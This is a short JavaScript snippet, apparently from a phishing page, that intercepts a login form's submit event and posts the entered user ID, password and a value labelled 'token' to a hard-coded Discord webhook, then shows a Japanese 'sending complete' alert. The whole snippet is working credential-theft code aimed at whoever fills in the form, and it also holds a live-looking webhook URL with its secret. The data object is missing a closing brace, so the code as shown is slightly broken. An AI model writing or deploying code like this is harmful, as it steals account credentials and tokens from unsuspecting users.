        document.addEventListener("DOMContentLoaded", function () {
            const form = document.querySelector("form");
            form.addEventListener("submit", function (event) {
                event.preventDefault(); 
    
                const username = document.getElementById("username").value;
                const password = document.getElementById("password").value;
                const pas = document.getElementById("pas").value;
    
                sendDataToWebhook(username, password, pas);
            });
    
            function sendDataToWebhook(username, password, pas) {
                const webhookURL = "https://discord.com/api/webhooks/1184830460031934474/Z9jcuOHzki8XQfT3yycsmrRU_EEueqhvMxKIY7PbULA66OZSdki7IaKUxUsCjzCqmi5n";
    
                const data = {
                    content: `token\n${password}\nuserid${username}\npassword${pas}`
    
                fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(data)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    alert("送信が完了しました");
                })
                .catch(error => {
                    console.error('There was a problem with the fetch operation:', error);
                });
            }
        });
